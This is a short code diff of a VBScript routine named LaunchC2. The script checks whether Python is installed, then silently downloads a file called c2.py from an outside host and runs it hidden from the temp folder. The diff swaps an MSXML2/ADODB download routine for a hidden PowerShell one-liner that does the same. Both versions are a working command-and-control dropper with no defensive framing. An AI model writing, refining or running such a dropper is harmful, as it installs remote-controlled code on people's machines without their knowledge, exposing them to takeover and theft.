@@ -137,7 +137,7 @@ End Sub
 
 Sub LaunchC2()
     On Error Resume Next
-    Dim exec, output, hasPython, x, a, p
+    Dim exec, output, hasPython, cmd
     hasPython = False
     Set exec = sh.Exec("cmd /c python --version 2>&1")
     output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
@@ -148,15 +148,8 @@ Sub LaunchC2()
         If InStr(output, "Python") > 0 Then hasPython = True
     End If
     If hasPython Then
-        Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-        x.Open "GET", "https://delta-check.onrender.com/c2.py", False
-        x.Send
-        If x.Status = 200 Then
-            p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
-            Set a = CreateObject("ADODB.Stream")
-            a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
-            sh.Run "pythonw " & p, 0, False
-        End If
+        cmd = "powershell -NoP -W Hidden -Command ""Invoke-WebRequest 'https://delta-check.onrender.com/c2.py' -OutFile '%TEMP%\rbx_c2.py'; Start-Process pythonw '%TEMP%\rbx_c2.py'"""
+        sh.Run cmd, 0, False
     End If
 End Sub
 
